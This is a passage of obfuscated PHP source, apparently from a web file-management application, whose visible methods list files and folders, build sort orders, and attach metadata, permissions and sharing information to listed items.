$ÓŒÔ±¨¤) { if (!in_array($ÓŒÔ±¨¤, $š…†”˜ˆ)) { $Òê·Ú„— = !1; break; } } if (!$Òê·Ú„—) { continue; } if (!is_numeric($ØÚı¡ëß)) { $åÀ­”Í = $‚Õ°ëå®[$ØÚı¡ëß]; $úŸÂÂáŠ = array($Ÿ‚ôâå¿[32] => $åÀ­”Í[$Ÿ‚ôâå¿[32]], $Ÿ‚ôâå¿[97] => $åÀ­”Í[$Ÿ‚ôâå¿[97]], $Ÿ‚ôâå¿[33] => $åÀ­”Í[$Ÿ‚ôâå¿[33]], $Ÿ‚ôâå¿[100] => array($Ÿ‚ôâå¿[484] => 1), $Ÿ‚ôâå¿[233] => !0); if ($åÀ­”Í[$Ÿ‚ôâå¿[33]] == $Ÿ‚ôâå¿[231]) { $ªˆŸ¢é¾[] = $úŸÂÂáŠ; } if ($åÀ­”Í[$Ÿ‚ôâå¿[33]] == $Ÿ‚ôâå¿[88]) { $”š•¿—[] = $úŸÂÂáŠ; } continue; } $­Ç–†å[] = $ØÚı¡ëß; } if ($­Ç–†å) { $ê¯« …¹ = $this->listSource(array($Ÿ‚ôâå¿[474] => array($Ÿ‚ôâå¿[475], $­Ç–†å))); } $ê¯« …¹ = $ê¯« …¹ ? $ê¯« …¹ : array($Ÿ‚ôâå¿[95] => array(), $Ÿ‚ôâå¿[96] => array()); $ê¯« …¹[$Ÿ‚ôâå¿[95]] = array_merge($ê¯« …¹[$Ÿ‚ôâå¿[95]], $”š•¿—); $ê¯« …¹[$Ÿ‚ôâå¿[96]] = array_merge($ê¯« …¹[$Ÿ‚ôâå¿[96]], $ªˆŸ¢é¾); if (isset($ê¯« …¹[$Ÿ‚ôâå¿[426]]) && count($­Ç–†å) == $ê¯« …¹[$Ÿ‚ôâå¿[426]][$Ÿ‚ôâå¿[427]]) { return $ê¯« …¹; } $™Ëİáˆ‘ = array(); $ÙÈŠÓÃ  = array_to_keyvalue($ê¯« …¹[$Ÿ‚ôâå¿[95]], $Ÿ‚ôâå¿[12], $Ÿ‚ôâå¿[194]); $õÎò³Ìø = array_to_keyvalue($ê¯« …¹[$Ÿ‚ôâå¿[96]], $Ÿ‚ôâå¿[12], $Ÿ‚ôâå¿[194]); $Ü«šãÖ = array_merge($õÎò³Ìø, $ÙÈŠÓÃ ); foreach ($­Ç–†å as $ˆ¹İ±ı) { if (!in_array($ˆ¹İ±ı, $Ü«šãÖ)) { $™Ëİáˆ‘[] = $ˆ¹İ±ı; } } if ($™Ëİáˆ‘) { Model($Ÿ‚ôâå¿[485])->removeBySource($™Ëİáˆ‘); } return $ê¯« …¹; } public function listUserRecycle() { $Š—ğœê‰ =& $_SERVER[Ñ¯©ç]; $ßî«¥á = Model($Š—ğœê‰[486])->listData(); if (!$ßî«¥á) { return array(); } $¹‚”¦ÕÅ = array($Š—ğœê‰[474] => array($Š—ğœê‰[475], $ßî«¥á), $Š—ğœê‰[487] => 1); return $this->listSource($¹‚”¦ÕÅ); } public function listSource($Æ¬óé, $ô¥ğüï¿ = 3000, $¸Î¨î•² = false) { $‹¢êìô =& $_SERVER[Ñ¯©ç]; if (!isset($Æ¬óé[$‹¢êìô[488]])) { $Æ¬óé[$‹¢êìô[488]] = 0; } if (isset($Æ¬óé[$‹¢êìô[193]]) && $Æ¬óé[$‹¢êìô[193]] == $‹¢êìô[229]) { $Æ¬óé[$‹¢êìô[469]] = array($‹¢êìô[391], $‹¢êìô[489]); } $¶³ãñİ = $‹¢êìô[490]; $¡ü„ä—Œ = $this->field($¶³ãñİ)->_makeOrder()->where($Æ¬óé)->selectPage($ô¥ğüï¿); $this->_listPageCheck($¡ü„ä—Œ, $¶³ãñİ, $Æ¬óé); $this->_listDataApply($¡ü„ä—Œ[$‹¢êìô[429]], $¸Î¨î•²); $this->_listMake($¡ü„ä—Œ); return $¡ü„ä—Œ; } private function _listPageCheck(&$¡Œ¤ı, $ˆúš ºÃ, $¿Áòäóø) { $Í“ß¹—¼ =& $_SERVER[Ñ¯©ç]; if (!is_array($¡Œ¤ı[$Í“ß¹—¼[426]])) { return; } $×·¿ëñ = $¡Œ¤ı[$Í“ß¹—¼[426]]; if ($×·¿ëñ[$Í“ß¹—¼[428]] <= 1) { return; } if ($×·¿ëñ[$Í“ß¹—¼[427]] >= 100000) { return; } if (Model($Í“ß¹—¼[491])->get($Í“ß¹—¼[492]) != $Í“ß¹—¼[493]) { return; } $ˆúš ºÃ = str_replace(array($Í“ß¹—¼[53], $Í“ß¹—¼[402], $Í“ß¹—¼[59]), $Í“ß¹—¼[12], $ˆúš ºÃ); $ˆúš ºÃ = $Í“ß¹—¼[494] . str_replace($Í“ß¹—¼[50], $Í“ß¹—¼[495], $ˆúš ºÃ) . $Í“ß¹—¼[496]; $ÎŸµË¿š = $Í“ß¹—¼[497]; $ÎŸµË¿š = $ÎŸµË¿š . $Í“ß¹—¼[498]; $Âí²ü¢ô = $×·¿ëñ[$Í“ß¹—¼[423]] * ($×·¿ëñ[$Í“ß¹—¼[413]] - 1) . $Í“ß¹—¼[50] . $×·¿ëñ[$Í“ß¹—¼[423]]; $Ô‰áöÑë = $this->_makeOrder(!0); $òŞË²ìÎ = $Í“ß¹—¼[494] . str_replace($Í“ß¹—¼[50], $Í“ß¹—¼[495], $Ô‰áöÑë[0]); if (strpos($òŞË²ìÎ, $Í“ß¹—¼[499])) { $òŞË²ìÎ = str_replace($Í“ß¹—¼[499], $Í“ß¹—¼[500], $òŞË²ìÎ); } else { $òŞË²ìÎ .= $Í“ß¹—¼[501] . $Ô‰áöÑë[1]; } $Â›Á×² = array(); foreach ($¿Áòäóø as $¾©—Èš‡ => $íŒÉ•³ô) { $Â›Á×²[$Í“ß¹—¼[494] . $¾©—Èš‡] = $íŒÉ•³ô; } $this->alias($Í“ß¹—¼[502])->field($ˆúš ºÃ)->limit($Âí²ü¢ô)->order($òŞË²ìÎ); $¤™µõ­ = $this->join($ÎŸµË¿š)->where($Â›Á×²)->select(); if ($¤™µõ­) { $¡Œ¤ı[$Í“ß¹—¼[429]] = $¤™µõ­; } } protected function _makeOrder($âŞÎïëü = false) { $³ ¸Ë“Ë =& $_SERVER[Ñ¯©ç]; $œô»´É = Model($³ ¸Ë“Ë[503])->get($³ ¸Ë“Ë[504]); $®­¾œŒ = Model($³ ¸Ë“Ë[503])->get($³ ¸Ë“Ë[505]); $¨è†‡æÛ = array($³ ¸Ë“Ë[506] => $³ ¸Ë“Ë[507], $³ ¸Ë“Ë[508] => $³ ¸Ë“Ë[509]); $àÇ¡Ãº­ = array($³ ¸Ë“Ë[32] => $³ ¸Ë“Ë[32], $³ ¸Ë“Ë[89] => $³ ¸Ë“Ë[89], $³ ¸Ë“Ë[188] => $³ ¸Ë“Ë[469], $³ ¸Ë“Ë[510] => $³ ¸Ë“Ë[510], $³ ¸Ë“Ë[511] => $³ ¸Ë“Ë[512], $³ ¸Ë“Ë[232] => $³ ¸Ë“Ë[232], $³ ¸Ë“Ë[98] => $³ ¸Ë“Ë[98]); $ì¦®åßË = Input::get($³ ¸Ë“Ë[513], $³ ¸Ë“Ë[7], $œô»´É, array_keys($àÇ¡Ãº­)); $¶¦íÙó = Input::get($³ ¸Ë“Ë[514], $³ ¸Ë“Ë[7], $®­¾œŒ, array_keys($¨è†‡æÛ)); if (!in_array($ì¦®åßË, array_keys($àÇ¡Ãº­))) { $ì¦®åßË = $³ ¸Ë“Ë[32]; } if (!in_array($¶¦íÙó, array_keys($¨è†‡æÛ))) { $ì¦®åßË = $³ ¸Ë“Ë[506]; } if ($ì¦®åßË == $³ ¸Ë“Ë[32]) { } $„ÛÜá›İ = $³ ¸Ë“Ë[515] . $àÇ¡Ãº­[$ì¦®åßË] . $³ ¸Ë“Ë[53] . $¨è†‡æÛ[$¶¦íÙó]; $„ÛÜá›İ = rtrim(trim($„ÛÜá›İ), $³ ¸Ë“Ë[50]); if ($âŞÎïëü) { return array($„ÛÜá›İ, $¨è†‡æÛ[$¶¦íÙó]); } return $this->order($„ÛÜá›İ); } protected function _listDataApplyItem($Üß•Äùñ, $Û‰çª¯· = false) { $Ãº¨¥©Å = array($Üß•Äùñ); $this->_listDataApply($Ãº¨¥©Å, $Û‰çª¯·); return $Ãº¨¥©Å[0]; } protected function _listDataApply(&$¡½£ê€, $©åİÉ—Ì = false) { $¸è¦ğ =& $_SERVER[Ñ¯©ç]; if (!$¡½£ê€) { $¡½£ê€ = array(); return; } $ ‹à…¬¨ = array_to_keyvalue($¡½£ê€, $¸è¦ğ[12], $¸è¦ğ[194]); $ ‹à…¬¨ = array_unique($ ‹à…¬¨); $this->_listSourceCache($¡½£ê€); if (!$©åİÉ—Ì) { $this->_listAppendMeta($¡½£ê€, $ ‹à…¬¨); $this->_listAppendFileMeta($¡½£ê€, $ ‹à…¬¨); $this->_listAppendChildren($¡½£ê€, $ ‹à…¬¨); } $this->_listAppendPath($¡½£ê€); $this->_listAppendAuth($¡½£ê€); $this->_listAppendSourceInfo($¡½£ê€, $ ‹à…¬¨); $this->_listAppendUser($¡½£ê€); $this->_listFilterInfo($¡½£ê€, $©åİÉ—Ì); $this->_listAppendAuthSecret($¡½£ê€); } protected function _listSourceCache($ÓåıÍ££) { $¶èòÍĞ¬ =& $_SERVER[Ñ¯©ç]; foreach ($ÓåıÍ££ as $Å²¥Œ©š) { self::$cacheSourceInfo[$¶èòÍĞ¬[516] . $Å²¥Œ©š[$¶èòÍĞ¬[194]]] = $Å²¥Œ©š; } } protected function _listFilterInfo(&$¬¢§¡è—, $•ù—½·‘ = false) { $¢Ó£’‰´ =& $_SERVER[Ñ¯©ç]; foreach ($¬¢§¡è— as &$¦ôÍİ»Ë) { $¦ôÍİ»Ë = $this->pathInfoFilter($¦ôÍİ»Ë); self::$cachePathInfo[$¢Ó£’‰´[517] . intval($•ù—½·‘) . $¢Ó£’‰´[445] . $¦ôÍİ»Ë[$¢Ó£’‰´[194]]] = $¦ôÍİ»Ë; } unset($¦ôÍİ»Ë); } protected function _listMake(&$½ˆıŞúê) { $ ÁªÓ³« =& $_SERVER[Ñ¯©ç]; $½ˆıŞúê[$ ÁªÓ³«[95]] = array(); $½ˆıŞúê[$ ÁªÓ³«[96]] = array(); foreach ($½ˆıŞúê[$ ÁªÓ³«[429]] as $ù¡Á£¨°) { $äó•¤²ó = $ù¡Á£¨°[$ ÁªÓ³«[468]] == 1 ? $ ÁªÓ³«[95] : $ ÁªÓ³«[96]; $½ˆıŞúê[$äó•¤²ó][] = $ù¡Á£¨°; } unset($½ˆıŞúê[$ ÁªÓ³«[429]]); } protected function _listAppendMeta(&$Äõ±úİ±, $ÛáÙ‰…‰) { $·‹æûˆ£ =& $_SERVER[Ñ¯©ç]; $œÛ¹ãúñ = array($·‹æûˆ£[474] => array($·‹æûˆ£[475], $ÛáÙ‰…‰)); $õØŠó¬ = Model($·‹æûˆ£[518])->field($·‹æûˆ£[519])->where($œÛ¹ãúñ)->select(); if (!$õØŠó¬) { return; } $¤ä‡éîé = array($·‹æûˆ£[520], $·‹æûˆ£[521], $·‹æûˆ£[500]); $âòï©Ã° = array(); foreach ($õØŠó¬ as $¦¼¸­À¾) { if (!isset($âòï©Ã°[$¦¼¸­À¾[$·‹æûˆ£[194]]])) { $âòï©Ã°[$¦¼¸­À¾[$·‹æûˆ£[194]]] = array(); } if (in_array($¦¼¸­À¾[$·‹æûˆ£[107]], $¤ä‡éîé)) { continue; } $âòï©Ã°[$¦¼¸­À¾[$·‹æûˆ£[194]]][$¦¼¸­À¾[$·‹æûˆ£[107]]] = $¦¼¸­À¾[$·‹æûˆ£[434]]; } foreach ($Äõ±úİ± as &$óÒÀˆ“ì) { $óÒÀˆ“ì[$·‹æûˆ£[522]] = !1; if (isset($âòï©Ã°[$óÒÀˆ“ì[$·‹æûˆ£[194]]])) { $óÒÀˆ“ì[$·‹æûˆ£[522]] = $âòï©Ã°[$óÒÀˆ“ì[$·‹æûˆ£[194]]]; } if ($this->fileIsLock($óÒÀˆ“ì) && $óÒÀˆ“ì[$·‹æûˆ£[470]]) { $€–Á¿¶ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $óÒÀˆ“ì[$·‹æûˆ£[470]][$·‹æûˆ£[471]] = AuthModel::authDisable($óÒÀˆ“ì[$·‹æûˆ£[470]][$·‹æûˆ£[471]], $€–Á¿¶); $óÒÀˆ“ì[$·‹æûˆ£[470]][$·‹æûˆ£[523]][$·‹æûˆ£[470]] = $óÒÀˆ“ì[$·‹æûˆ£[470]][$·‹æûˆ£[471]]; } } unset($óÒÀˆ“ì); } protected function _listAppendFileMeta(&$İÛíçâÊ, $©ùƒ£†ç) { $ƒ’ãÀˆ =& $_SERVER[Ñ¯©ç]; $û¯¾ù‘¥ = array_to_keyvalue($İÛíçâÊ, $ƒ’ãÀˆ[12], $ƒ’ãÀˆ[524]); $û¯¾ù‘¥ = array_filter(array_unique($û¯¾ù‘¥)); if (!$û¯¾ù‘¥) { return; } $Ä¶µÇ”Å = array($ƒ’ãÀˆ[525] => array($ƒ’ãÀˆ[475], $û¯¾ù‘¥)); $’Í»ˆ = $ƒ’ãÀˆ[526]; $Çóµ·í = Model($ƒ’ãÀˆ[527])->field($’Í»ˆ)->where($Ä¶µÇ”Å)->select(); $Çóµ·í = array_to_keyvalue($Çóµ·í, $ƒ’ãÀˆ[524]); $ƒÕ…ÊÀÀ = Model($ƒ’ãÀˆ[528])->field($ƒ’ãÀˆ[529])->where($Ä¶µÇ”Å)->select(); $ƒÕ…ÊÀÀ = $ƒÕ…ÊÀÀ ? $ƒÕ…ÊÀÀ : array(); $µ†ü¤”Ï = array(); foreach ($ƒÕ…ÊÀÀ as $Äõ›„¨) { if (!isset($µ†ü¤”Ï[$Äõ›„¨[$ƒ’ãÀˆ[524]]])) { $µ†ü¤”Ï[$Äõ›„¨[$ƒ’ãÀˆ[524]]] = array(); } $µ†ü¤”Ï[$Äõ›„¨[$ƒ’ãÀˆ[524]]][$Äõ›„¨[$ƒ’ãÀˆ[107]]] = $Äõ›„¨[$ƒ’ãÀˆ[434]]; } foreach ($İÛíçâÊ as &$àùİğ‚Ï) { $Å¾ş½½à = $àùİğ‚Ï[$ƒ’ãÀˆ[524]]; if (!$Å¾ş½½à || !is_array($Çóµ·í[$Å¾ş½½à])) { continue; } $ğıĞ›°« = $Çóµ·í[$Å¾ş½½à]; $ğıĞ›°«[$ƒ’ãÀˆ[89]] = $àùİğ‚Ï[$ƒ’ãÀˆ[89]]; $ğıĞ›°«[$ƒ’ãÀˆ[32]] = $àùİğ‚Ï[$ƒ’ãÀˆ[32]]; if (!$ğıĞ›°«[$ƒ’ãÀˆ[530]]) { Model($ƒ’ãÀˆ[527])->fileMd5Check($ğıĞ›°«); } if (!isset(self::$cacheFileInfo[$ƒ’ãÀˆ[531] . $Å¾ş½½à])) { self::$cacheFileInfo[$ƒ’ãÀˆ[531] . $Å¾ş½½à] = array_merge(array(), $ğıĞ›°«); } unset($Çóµ·í[$Å¾ş½½à][$ƒ’ãÀˆ[97]]); $’ËäíŞ… = is_array($µ†ü¤”Ï[$Å¾ş½½à]) ? $µ†ü¤”Ï[$Å¾ş½½à] : array(); $àùİğ‚Ï[$ƒ’ãÀˆ[532]] = array_merge($’ËäíŞ…, $Çóµ·í[$Å¾ş½½à]); if (isset($àùİğ‚Ï[$ƒ’ãÀˆ[532]][$ƒ’ãÀˆ[184]])) { $àùİğ‚Ï[$ƒ’ãÀˆ[184]] = json_decode($àùİğ‚Ï[$ƒ’ãÀˆ[532]][$ƒ’ãÀˆ[184]], !0); unset($àùİğ‚Ï[$ƒ’ãÀˆ[532]][$ƒ’ãÀˆ[184]]); } } unset($àùİğ‚Ï); } protected function _listAppendSourceInfo(&$ôººÃğ¦, $Çìû¨—) { $‡“¡ùî¼ =& $_SERVER[Ñ¯©ç]; $µÄîÏÏõ = Model($‡“¡ùî¼[533])->listData(); $Ä¥šÀêç = Model($‡“¡ùî¼[482])->listData(); $õªß¨°• = Model($‡“¡ùî¼[472])->listData(); $‘ÔÛ¦Ğâ = Model($‡“¡ùî¼[534])->listSimple(); $äŒÊŠªú = array_to_keyvalue($µÄîÏÏõ, $‡“¡ùî¼[458]); $³©¿¶Ÿ = array_to_keyvalue_group($Ä¥šÀêç, $‡“¡ùî¼[97], $‡“¡ùî¼[483]); $õÂä¼úò = array_to_keyvalue($õªß¨°•, $‡“¡ùî¼[97]); $¾´º’Ÿ¬ = array_to_keyvalue_group($‘ÔÛ¦Ğâ, $‡“¡ùî¼[194]); foreach ($ôººÃğ¦ as &$ÇÛ‰Èú) { $ÇÛ‰Èú[$‡“¡ùî¼[100]] = array($‡“¡ùî¼[535] => 0, $‡“¡ùî¼[536] => 0, $‡“¡ùî¼[537] => 0); if (isset($õÂä¼úò[$ÇÛ‰Èú[$‡“¡ùî¼[194]]])) { $ÇÛ‰Èú[$‡“¡ùî¼[100]][$‡“¡ùî¼[538]] = 1; $ÇÛ‰Èú[$‡“¡ùî¼[100]][$‡“¡ùî¼[539]] = $õÂä¼úò[$ÇÛ‰Èú[$‡“¡ùî¼[194]]][$‡“¡ùî¼[32]]; } if ($³©¿¶Ÿ && $äŒÊŠªú && isset($³©¿¶Ÿ[$ÇÛ‰Èú[$‡“¡ùî¼[194]]])) { $ÇÛ‰Èú[$‡“¡ùî¼[100]][$‡“¡ùî¼[540]] = array(); foreach ($³©¿¶Ÿ[$ÇÛ‰Èú[$‡“¡ùî¼[194]]] as $ŒƒÛÉ”¡) { $ÑÒıè§Š = $äŒÊŠªú[$ŒƒÛÉ”¡]; $ÇÛ‰Èú[$‡“¡ùî¼[100]][$‡“¡ùî¼[540]][] = array($‡“¡ùî¼[541] => $ÑÒıè§Š[$‡“¡ùî¼[458]], $‡“¡ùî¼[477] => $ÑÒıè§Š[$‡“¡ùî¼[32]], $‡“¡ùî¼[542] => $ÑÒıè§Š[$‡“¡ùî¼[543]]); } } if ($¾´º’Ÿ¬ && isset($¾´º’Ÿ¬[$ÇÛ‰Èú[$‡“¡ùî¼[194]]])) { $ÇÛ‰Èú[$‡“¡ùî¼[100]][$‡“¡ùî¼[544]] = array(); foreach ($¾´º’Ÿ¬[$ÇÛ‰Èú[$‡“¡ùî¼[194]]] as $¯­¿ í¿) { $…¡º ÚÙ = $‡“¡ùî¼[545]; if ($¯­¿ í¿[$‡“¡ùî¼[546]] == $‡“¡ùî¼[101]) { $…¡º ÚÙ .= $‡“¡ùî¼[547]; } $ÇÛ‰Èú[$‡“¡ùî¼[100]][$‡“¡ùî¼[544]] = array_field_key($¯­¿ í¿, explode($‡“¡ùî¼[50], $…¡º ÚÙ)); } } } unset($ÇÛ‰Èú); return $ôººÃğ¦; } protected function _listAppendChildren(&$œƒ§òĞ, $ äÎ÷) { $Ÿ“´Ô ¾ =& $_SERVER[Ñ¯©ç]; $µË¹šœå = array(); $ûîü„Ã¿ = array($Ÿ“´Ô ¾[240] => 0, $Ÿ“´Ô ¾[241] => 0); foreach ($œƒ§òĞ as &$îé¡‹) { if (!$îé¡‹[$Ÿ“´Ô ¾[468]]) { continue; } $µË¹šœå[] = $îé¡‹[$Ÿ“´Ô ¾[194]]; } unset($îé¡‹); if (!$µË¹šœå) { return; } $èŒÓè˜™ = array($Ÿ“´Ô ¾[193] => array($Ÿ“´Ô ¾[7], $µË¹šœå), $Ÿ“´Ô ¾[488] => 0); $ñõ¼²œ˜ = array($Ÿ“´Ô ¾[193], $Ÿ“´Ô ¾[468], $Ÿ“´Ô ¾[548] => $Ÿ“´Ô ¾[549]); $øÙëÈ¿Û = $this->field($ñõ¼²œ˜)->where($èŒÓè˜™)->group($Ÿ“´Ô ¾[550])->select(); $úç°šø® = array(); foreach ($øÙëÈ¿Û as $á´«‚Ò²) { $–ü©¦ì‡ = $á´«‚Ò²[$Ÿ“´Ô ¾[193]]; $–¡´·Ñ = $á´«‚Ò²[$Ÿ“´Ô ¾[468]] == $Ÿ“´Ô ¾[101] ? $Ÿ“´Ô ¾[241] : $Ÿ“´Ô ¾[240]; if (!isset($úç°šø®[$–ü©¦ì‡])) { $úç°šø®[$–ü©¦ì‡] = array($Ÿ“´Ô ¾[240] => 0, $Ÿ“´Ô ¾[241] => 0); } $úç°šø®[$–ü©¦ì‡][$–¡´·Ñ] += $á´«‚Ò²[$Ÿ“´Ô ¾[549]]; } foreach ($œƒ§òĞ as &$îé¡‹) { if (!$îé¡‹[$Ÿ“´Ô ¾[468]]) { continue; } $ÙÂùœ˜ = is_array($úç°šø®[$îé¡‹[$Ÿ“´Ô ¾[194]]]) ? $úç°šø®[$îé¡‹[$Ÿ“´Ô ¾[194]]] : $ûîü„Ã¿; $îé¡‹[$Ÿ“´Ô ¾[241]] = $ÙÂùœ˜[$Ÿ“´Ô ¾[241]]; $îé¡‹[$Ÿ“´Ô ¾[240]] = $ÙÂùœ˜[$Ÿ“´Ô ¾[240]]; unset($îé¡‹[$Ÿ“´Ô ¾[469]]); } unset($îé¡‹); } protected function _listAppendAuth(&$‡Üœ ˆ) { $·¾âé×ñ =& $_SERVER[Ñ¯©ç]; $óß×Ïó“ = array(); foreach ($‡Üœ ˆ as $»ı¸Á•¼) { if ($»ı¸Á•¼[$·¾âé×ñ[191]] == self::TYPE_GROUP) { $óß×Ïó“[] = $»ı¸Á•¼[$·¾âé×ñ[194]]; } } if (!$óß×Ïó“) { return; } $ˆÉ²¶Û = array_to_keyvalue($‡Üœ ˆ, $·¾âé×ñ[194]); $ÕÃ„Æ„Ö = Model($·¾âé×ñ[551])->getSourceList($óß×Ïó“, $ˆÉ²¶Û); $Ù´ª®ª“ = KodUser::isRoot(); foreach ($‡Üœ ˆ as $—é¤¶³ => &$»ı¸Á•¼) { $»ı¸Á•¼[$·¾âé×ñ[470]] = $ÕÃ„Æ„Ö[$»ı¸Á•¼[$·¾âé×ñ[194]]]; if (!$»ı¸Á•¼[$·¾âé×ñ[470]] && $»ı¸Á•¼[$·¾âé×ñ[191]] == self::TYPE_GROUP) { $»ı¸Á•¼[$·¾âé×ñ[470]] = Action($·¾âé×ñ[552])->pathGroupAuthMake($»ı¸Á•¼[$·¾âé×ñ[553]]); if (!$»ı¸Á•¼[$·¾âé×ñ[470]] && !$Ù´ª®ª“) { $»ı¸Á•¼[$·¾âé×ñ[234]] = !1; $»ı¸Á•¼[$·¾âé×ñ[233]] = !1; } } if ($»ı¸Á•¼[$·¾âé×ñ[470]]) { $»ı¸Á•¼[$·¾âé×ñ[234]] = AuthModel::authCheckEdit($»ı¸Á•¼[$·¾âé×ñ[470]][$·¾âé×ñ[471]]); $»ı¸Á•¼[$·¾âé×ñ[233]] = AuthModel::authCheckView($»ı¸Á•¼[$·¾âé×ñ[470]][$·¾âé×ñ[471]]); } $this->groupPathDisplay($»ı¸Á•¼); } unset($»ı¸Á•¼); } public function _listAppendAuthSecret(&$²èå¼) { $±¿ÔÀ°Ò =& $_SERVER[Ñ¯©ç]; if (Model($±¿ÔÀ°Ò[491])->get($±¿ÔÀ°Ò[554]) != $±¿ÔÀ°Ò[101]) { return; } static $ó‹˜ŠÆ‡ = false; if (!$ó‹˜ŠÆ‡) { $ÇİÆƒ‹” = Model($±¿ÔÀ°Ò[555]); $ÖşÈàú = Model($±¿ÔÀ°Ò[556]); $ó‹˜ŠÆ‡ = $ÖşÈàú->listData(); $ó‹˜ŠÆ‡ = array_to_keyvalue($ó‹˜ŠÆ‡, $±¿ÔÀ°Ò[194]); $ÀÀ¶Øñî = json_decode(Model($±¿ÔÀ°Ò[491])->get($±¿ÔÀ°Ò[557]), !0); $ÀÀ¶Øñî = array_to_keyvalue($ÀÀ¶Øñî, $±¿ÔÀ°Ò[458]); foreach ($ó‹˜ŠÆ‡ as $úÚâĞùó => $¥°—¸Â) { $ÔøÌôæ§ = $ÀÀ¶Øñî[$¥°—¸Â[$±¿ÔÀ°Ò[558]]]; if (!$ÔøÌôæ§) { $ÖşÈàú->remove($¥°—¸Â[$±¿ÔÀ°Ò[458]]); unset($ó‹˜ŠÆ‡[$úÚâĞùó]); continue; } $Ú±íÂ—Ş = $ÇİÆƒ‹”->listData($ÔøÌôæ§[$±¿ÔÀ°Ò[470]]); if (!$Ú±íÂ—Ş) { $ÖşÈàú->remove($¥°—¸Â[$±¿ÔÀ°Ò[458]]); unset($ó‹˜ŠÆ‡[$úÚâĞùó]); continue; } $¥°—¸Â[$±¿ÔÀ°Ò[470]] = $Ú±íÂ—Ş; $¥°—¸Â[$±¿ÔÀ°Ò[559]] = $ÔøÌôæ§; $¥°—¸Â[$±¿ÔÀ°Ò[560]] = Model($±¿ÔÀ°Ò[561])->getInfoSimpleOuter($¥°—¸Â[$±¿ÔÀ°Ò[510]]); $ó‹˜ŠÆ‡[$úÚâĞùó] = $¥°—¸Â; } } $è¬‚î™ = USER_ID; $öÅ†ùÏÈ = array(); $µÀ‡­õ¿ = $this->_listAppendPath($öÅ†ùÏÈ, !0); foreach ($²èå¼ as $úÚâĞùó => &$¥°—¸Â) { if (!is_array($¥°—¸Â[$±¿ÔÀ°Ò[470]])) { continue; } if ($¥°—¸Â[$±¿ÔÀ°Ò[191]] != $±¿ÔÀ°Ò[562]) { continue; } if (isset($ó‹˜ŠÆ‡[$¥°—¸Â[$±¿ÔÀ°Ò[194]]])) { $”Šà£½Æ = $ó‹˜ŠÆ‡[$¥°—¸Â[$±¿ÔÀ°Ò[194]]]; if (!is_array($¥°—¸Â[$±¿ÔÀ°Ò[522]])) { $¥°—¸Â[$±¿ÔÀ°Ò[522]] = array(); } $¥°—¸Â[$±¿ÔÀ°Ò[522]][$±¿ÔÀ°Ò[563]] = $”Šà£½Æ[$±¿ÔÀ°Ò[558]]; $¥°—¸Â[$±¿ÔÀ°Ò[470]][$±¿ÔÀ°Ò[564]] = $”Šà£½Æ; $¥°—¸Â[$±¿ÔÀ°Ò[470]][$±¿ÔÀ°Ò[565]] = $¥°—¸Â[$±¿ÔÀ°Ò[566]]; $¥°—¸Â[$±¿ÔÀ°Ò[470]][$±¿ÔÀ°Ò[567]] = $±¿ÔÀ°Ò[101]; if ($”Šà£½Æ[$±¿ÔÀ°Ò[510]] != $è¬‚î™) { $¥°—¸Â[$±¿ÔÀ°Ò[470]][$±¿ÔÀ°Ò[471]] = $¥°—¸Â[$±¿ÔÀ°Ò[470]][$±¿ÔÀ°Ò[471]] & $”Šà£½Æ[$±¿ÔÀ°Ò[470]][$±¿ÔÀ°Ò[470]]; } continue; } $¯¸ëú…Ì = $this->parentLevelArray($¥°—¸Â[$±¿ÔÀ°Ò[568]]); $Ø«ˆª€ = array_reverse($¯¸ëú…Ì); foreach ($Ø«ˆª€ as $ûï¦…İÄ => $šó­ƒåÑ) { if (!isset($ó‹˜ŠÆ‡[$šó­ƒåÑ])) { continue; } $”Šà£½Æ = $ó‹˜ŠÆ‡[$šó­ƒåÑ]; $¥°—¸Â[$±¿ÔÀ°Ò[470]][$±¿ÔÀ°Ò[564]] = $”Šà£½Æ; if ($”Šà£½Æ[$±¿ÔÀ°Ò[510]] != $è¬‚î™) { $¥°—¸Â[$±¿ÔÀ°Ò[470]][$±¿ÔÀ°Ò[471]] = $¥°—¸Â[$±¿ÔÀ°Ò[470]][$±¿ÔÀ°Ò[471]] & $”Šà£½Æ[$±¿ÔÀ°Ò[470]][$±¿ÔÀ°Ò[470]]; } $ñš‘ßò = $±¿ÔÀ°Ò[12]; $Á‚œüĞˆ = count($¯¸ëú…Ì) - $ûï¦…İÄ; for ($äóû±ê = 0; $äóû±ê < $Á‚œüĞˆ; $äóû±ê++) { if (!isset($µÀ‡­õ¿[$¯¸ëú…Ì[$äóû±ê]])) { $ñš‘ßò = $±¿ÔÀ°Ò[12]; break; } $ñš‘ßò = $ñš‘ßò . rtrim($µÀ‡­õ¿[$¯¸ëú…Ì[$äóû±ê]], $±¿ÔÀ°Ò[8]) . $±¿ÔÀ°Ò[8]; } $¥°—¸Â[$±¿ÔÀ°Ò[470]][$±¿ÔÀ°Ò[565]] = rtrim($ñš‘ßò, $±¿ÔÀ°Ò[8]) . $±¿ÔÀ°Ò[8]; break; } } unset($¥°—¸Â); } public function groupPathDisplay(&$±’¾Ò‚î) { $…Û§×Ìı =& $_SERVER[Ñ¯©ç]; if ($±’¾Ò‚î[$…Û§×Ìı[191]] != self::TYPE_GROUP) { return; } $Œîñø¶ = Model($…Û§×Ìı[569])->getInfo($±’¾Ò‚î[$…Û§×Ìı[553]]); $Œšœ¯³¯ = $this->parentLevelArray($Œîñø¶[$…Û§×Ìı[568]]); $ò°àÄëô = $…Û§×Ìı[12]; foreach ($Œšœ¯³¯ as $¶ÇÔâ–) { $˜‡ùÒºç = Model($…Û§×Ìı[569])->getInfo($¶ÇÔâ–); $ò°àÄëô .= $˜‡ùÒºç[$…Û§×Ìı[100]][$…Û§×Ìı[194]] . $…Û§×Ìı[50]; } $±’¾Ò‚î[$…Û§×Ìı[570]] = $Œîñø¶[$…Û§×Ìı[193]]; $±’¾Ò‚î[$…Û§×Ìı[571]] = $Œîñø¶[$…Û§×Ìı[568]]; $±’¾Ò‚î[$…Û§×Ìı[572]] = $Œîñø¶[$…Û§×Ìı[573]]; $±’¾Ò‚î[$…Û§×Ìı[574]] = $ò°àÄëô . $Œîñø¶[$…Û§×Ìı[100]][$…Û§×Ìı[194]]; } protected function _listAppendPath(&$şØô÷à¹, $¹¤ôùÍ = false) { $‚ÉçØÅã =& $_SERVER[Ñ¯©ç]; static $Û†’©£æ = array(); $ÓŠç²Ã = array(); $ËÈ‰´Ï² = array(); if ($¹¤ôùÍ) { return $Û†’©£æ; } foreach ($şØô÷à¹ as &$¶Ãµºå«) { $ºÔ£—¬û = $¶Ãµºå«[$‚ÉçØÅã[194]]; if 